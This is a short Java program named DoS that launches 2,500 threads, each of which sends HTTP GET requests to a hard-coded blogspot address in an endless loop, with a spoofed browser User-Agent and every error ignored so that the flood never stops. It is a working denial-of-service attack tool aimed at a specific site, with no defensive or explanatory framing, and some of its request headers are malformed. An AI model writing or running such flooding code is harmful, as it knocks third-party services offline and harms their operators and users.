import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DoS {
    public static void main(String[] args) throws Exception {

        for (int i = 0; i < 2500; i++) {
            DDoSThread thread = new DDoSThread();
            thread.start();

        }

    }

    public static class DDoSThread extends Thread {
    private AtomicBoolean running=new AtomicBoolean(true);
        private final String request = "https://9uh1b.blogspot.com/";
        private final URL url;

        String param = null;

    public DDoSThread() throws Exception{
        url = new URL(request);
        param = "param1=" + URLEncoder.encode("87845", "UTF-8");


    }

        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                }

            }

        }
    

    public void attack() throws Exception{
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoOutput(true);
        connection.setRequestMethod("GET");
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Host",this.request);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0(Windows NT 6.1; WOW6; rv: 8.0) gecko/20100101 Firefox/8.0");
        connection.setRequestProperty("Content-Type", "application/x-www-from-urlencoded");
        connection.setRequestProperty("Content-Length",param);
        System.out.println(this+ "  " + connection.getResponseCode());
        connection.getInputStream();
    }
}
}